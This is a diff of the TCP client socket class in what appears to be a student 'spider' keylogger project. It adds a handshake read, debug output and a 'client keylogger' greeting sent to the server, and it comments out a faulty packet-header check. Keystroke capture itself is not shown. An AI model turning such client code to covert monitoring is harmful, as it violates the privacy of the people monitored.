@@ -5,7 +5,7 @@
 // Login   <gandoulf@epitech.net>
 //
 // Started on  Wed Nov  9 15:32:04 2016 Gandoulf
-// Last update Sun Nov 13 16:47:53 2016 Gandoulf
+// Last update Sun Nov 13 20:14:46 2016 Gandoulf
 //
 
 #include <cstdlib>
@@ -20,12 +20,22 @@ namespace spider
   namespace socket
   {
     ClientTcpSocket::ClientTcpSocket(std::string adresse, int port)
-      : _runningService(false), _adresse(adresse), _port(port)
+      : _runningService(false), _adresse(adresse), _port(port), _clientID(0), _firstRead(true)
     {
       memset(&_data[0], 0, 128);
       _client.OnReadPossible([this](Socket::Client &client, size_t length)
 			     {
-			       readHeader();
+			       std::cout << "length = " << length << std::endl;
+			       if (/*_firstRead &&*/ length == 21)
+				 {
+				   _firstRead = false;
+				   memset(&_data[0], 0, 128);
+				   _client.read(static_cast<void *>(_data), 21);
+				   std::cout << _data << std::endl;
+				 }
+			       //else if (!_firstRead)
+			       else if (length >= sizeof(PackageHeader))
+				 readHeader();
 			     });
       _client.OnWritePossible([this](Socket::Client &client)
 			      {
@@ -33,7 +43,7 @@ namespace spider
 			      });
       _client.OnStart([this](Socket::Client &client, std::string const &address, int port)
 		      {
-			connect();
+			std::cout << "connection" << std::endl;
 		      });
       _client.OnDisconnect([this](Socket::Client &client)
 			   {
@@ -80,6 +90,11 @@ namespace spider
     {
       if (!_runningService)
 	{
+	  _firstRead = true;
+	  char *msg = new char[18];
+	  std::memcpy(msg, "client keylogger\n", 17);
+	  _messages.push_back(msg);
+	  _messagesSize.push_back(17);
 	  _runningService = true;
 	  std::cout << "starting client" << std::endl;
 	  _client.start(_adresse, _port);
@@ -119,6 +134,10 @@ namespace spider
       memset(&_data[0], 0, 128);
       _client.read(static_cast<void *>(_data), sizeof(PackageHeader));
       _packet.setHeader(_data, sizeof(PackageHeader));
+      /*if(_packet.getHeader().magicNumber != SEND ||
+	 _packet.getHeader().magicNumber != REC ||
+	 _packet.getHeader().size > 1000)
+	 _client.disconnect();*/
       readData();
     }
 
@@ -166,6 +185,10 @@ namespace spider
       _Mqueue.lock();
       if (!_messages.empty())
 	{
+	  for (int i = 0; i < _messagesSize.front(); ++i) {
+	    std::cout << std::hex << (int)(_messages.front()[i]);
+	  }
+	  std::cout << std::dec << std::endl;
 	  _client.write(_messages.front(), _messagesSize.front());
 	  delete[] _messages.front();
 	  _messages.pop_front();
